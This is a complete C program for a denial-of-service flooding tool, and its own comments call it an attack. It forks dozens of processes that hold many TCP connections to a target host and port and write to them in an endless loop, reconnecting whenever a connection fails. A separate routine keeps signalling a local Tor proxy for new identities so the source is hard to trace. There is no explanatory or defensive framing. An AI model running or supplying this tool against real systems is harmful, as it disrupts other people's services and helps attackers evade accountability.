#include <stdio.h>        // Standard I/O functions
#include <stdlib.h>       // Standard library functions (e.g., memory allocation, exit)
#include <string.h>       // String handling functions
#include <stdint.h>       // Standard integer types
#include <unistd.h>       // POSIX API (e.g., fork, usleep)
#include <netdb.h>        // Network database operations
#include <signal.h>       // Signal handling
#include <sys/socket.h>   // Socket API
#include <sys/types.h>    // Data types for sockets
#include <netinet/in.h>   // Internet address structures
#include <arpa/inet.h>    // Functions for manipulating IP addresses

// Function to create and connect a socket to the target host and port
int make_socket(char *host, char *port) {
    struct addrinfo hints, *servinfo, *p; // For resolving the target address
    int sock, r;

    // Initialize the `hints` structure
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;        // Allow IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM;    // Use TCP protocol

    // Get address info for the target host and port
    if ((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
        exit(0); // Exit if address resolution fails
    }

    // Iterate through the results and try to connect to server
    for (p = servinfo; p != NULL; p = p->ai_next) {
        // Create a socket
        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue; // Skip if socket creation fails
        }
        // Attempt to connect the socket
        if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock); // Close the socket if connection fails
            continue;
        }
        break; // Stop if a connection is successful
    }

    // If no connection could be made, exit the program
    if (p == NULL) {
        if (servinfo)
            freeaddrinfo(servinfo); // Free the allocated memory for address info
        fprintf(stderr, "No connection could be made\n");
        exit(0);
    }

    if (servinfo)
        freeaddrinfo(servinfo); // Free the allocated memory
    fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
    return sock; // Return the connected socket
}

// Signal handler for broken pipe signals (no action needed)
void broke(int s) {
    // Do nothing
}

// Define the number of connections and threads for the attack
#define CONNECTIONS 8
#define THREADS 48

// Function to perform the attack
void attack(char *host, char *port, int id) {
    int sockets[CONNECTIONS]; // Array to hold multiple sockets
    int x, g = 1, r;

    // Initialize all sockets to 0 (not connected)
    for (x = 0; x != CONNECTIONS; x++)
        sockets[x] = 0;

    // Handle broken pipe signals to avoid program termination
    signal(SIGPIPE, &broke);

    // Infinite loop to keep the attack running
    while (1) {
        for (x = 0; x != CONNECTIONS; x++) {
            if (sockets[x] == 0)
                sockets[x] = make_socket(host, port); // Create a new socket if not connected
            r = write(sockets[x], "\0", 1); // Send a zero-byte message
            if (r == -1) { // If sending fails
                close(sockets[x]); // Close the socket
                sockets[x] = make_socket(host, port); // Reconnect the socket
            }
            fprintf(stderr, "[%i: Voly Sent]\n", id); // Log the sent message
        }
        usleep(300000); // Delay to avoid overwhelming system resources
    }
}

// Function to cycle IP addresses using Tor (if applicable)
void cycle_identity() {
    int r;
    int socket = make_socket("localhost", "9050"); // Connect to Tor proxy
    write(socket, "AUTHENTICATE \"\"\n", 16); // Authenticate with Tor proxy

    while (1) { // Infinite loop to keep cycling identities
        r = write(socket, "signal NEWNYM\n\x00", 16); // Request new identity
        fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r); // Log the signal
        usleep(300000); // Delay to avoid overwhelming the proxy
    }
}

// Main function to start the program
int main(int argc, char **argv) {
    int x;

    // If arguments are not provided, cycle identities (optional functionality)
    if (argc != 3)
        cycle_identity();

    // Create multiple threads to perform the attack
    for (x = 0; x != THREADS; x++) {
        if (fork()) // Create a child process
            attack(argv[1], argv[2], x); // Start an attack in the child process
        usleep(200000); // Delay to stagger thread execution
    }

    getc(stdin); // Wait for user input to keep the program running
    return 0; // Exit the program
}
